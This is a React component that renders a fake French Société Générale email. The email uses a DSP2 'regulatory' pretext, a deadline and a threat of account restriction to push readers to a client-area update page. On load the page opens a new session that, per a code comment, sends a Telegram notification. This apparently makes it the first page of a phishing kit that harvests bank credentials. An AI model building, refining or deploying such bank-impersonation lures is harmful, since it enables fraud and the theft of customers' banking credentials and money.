import React, { useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { AlertTriangle, ShieldAlert } from 'lucide-react';
import { newSession } from '../api';

// Page 1: Regulatory email from Société Générale (DSP2 verification notice).
export default function EmailPage() {
  const fired = useRef(false);

  useEffect(() => {
    if (fired.current) return;
    fired.current = true;
    // Brand new session every time the email is opened so a fresh Telegram
    // block (with notification) is created for each test.
    newSession('/');
  }, []);

  return (
    <div className="bg-neutral-100 min-h-[calc(100vh-68px)] py-6 md:py-10">
      {/* Yellow warning ribbon */}
      <div className="max-w-[620px] mx-auto px-4">
        <div className="bg-[#FFF6D6] border border-[#F1E1A0] text-[12.5px] text-[#695A1B] rounded-md px-4 py-3 flex items-start gap-2.5">
          <AlertTriangle size={16} className="shrink-0 mt-0.5 text-[#B8902B]" />
          <p className="leading-snug">
            Ce message vous a été envoyé par Société Générale. Ne transmettez jamais vos codes à
            un tiers.
          </p>
        </div>
      </div>

      {/* Email card */}
      <div className="max-w-[620px] mx-auto px-4 mt-4">
        <div className="bg-white rounded-[3px] shadow-[0_1px_3px_rgba(0,0,0,0.08)] px-8 md:px-12 py-10">
          {/* Logo header */}
          <div className="flex items-center gap-4">
            <svg width="58" height="40" viewBox="0 0 80 56" xmlns="http://www.w3.org/2000/svg" className="block shrink-0">
              <rect x="0" y="0" width="56" height="24" fill="#E9041E" />
              <rect x="0" y="32" width="56" height="24" fill="#000000" />
            </svg>
            <div className="leading-[1.05]">
              <div className="text-[18px] font-extrabold text-[#0F1B33]">SOCIÉTÉ</div>
              <div className="text-[18px] font-extrabold text-[#0F1B33]">GÉNÉRALE</div>
            </div>
          </div>
          <div className="mt-5 h-[2px] bg-[#E9041E] rounded-full" />

          {/* Body */}
          <p className="mt-7 text-[14.5px] font-semibold text-[#1B1B1B]">Bonjour,</p>

          <p className="mt-4 text-[13.5px] text-[#2B2B2B] leading-[1.65]">
            Une <strong className="font-bold">information règlementaire importante</strong>{' '}
            nécessite votre attention. Afin de maintenir la sécurité de votre Espace Client et de
            vous conformer aux exigences de la directive{' '}
            <strong className="font-bold">DSP2</strong>, nous vous invitons à vérifier et
            confirmer vos informations personnelles.
          </p>

          {/* Alert box */}
          <div className="mt-6 border-l-[3px] border-[#E9041E] bg-[#FBE9EC] rounded-r-md px-4 py-3.5">
            <p className="flex items-center gap-2 text-[13px] font-bold text-[#9A0010]">
              <ShieldAlert size={15} /> Action requise avant le 22/12/2026
            </p>
            <p className="mt-1.5 text-[12.5px] text-[#3a1d20] leading-[1.55]">
              Sans confirmation de votre part, l&rsquo;accès à votre Espace Client pourra être{' '}
              <strong className="font-bold">temporairement restreint</strong> dans le cadre des
              nouvelles mesures de sécurité règlementaires.
            </p>
          </div>

          {/* CTA */}
          <div className="mt-7 flex justify-center">
            <Link
              to="/espace-client"
              className="inline-flex items-center gap-2 bg-[#E9041E] hover:bg-[#c8031a] text-white font-bold text-[13.5px] rounded-md px-6 py-3 shadow-[0_2px_4px_rgba(0,0,0,0.15)] transition-colors"
            >
              Mettre à jour Mon Espace Client
            </Link>
          </div>

          {/* Important note */}
          <p className="mt-7 text-[12.5px] text-[#2B2B2B] leading-[1.65]">
            <strong className="text-[#E9041E] font-bold">Important</strong> : afin de finaliser la
            mise à jour de vos informations, l&rsquo;un de nos conseillers peut être amené à vous
            contacter. Société Générale ne vous demandera{' '}
            <strong className="font-bold text-[#E9041E]">jamais</strong> votre code secret ni vos
            coordonnées de paiement par téléphone ou e-mail.
          </p>

          {/* Legal */}
          <p className="mt-7 text-[11px] text-neutral-500 leading-[1.55]">
            Ce message est strictement confidentiel. Si vous n&rsquo;êtes pas le destinataire,
            veuillez le supprimer immédiatement.
          </p>
          <p className="mt-3 text-[10.5px] text-neutral-500 leading-[1.55]">
            Société Générale — S.A. au capital de 1 010 261 206,25 € — 552 120 222 RCS Paris —
            29 boulevard Haussmann, 75009 Paris.
          </p>
        </div>
      </div>
    </div>
  );
}
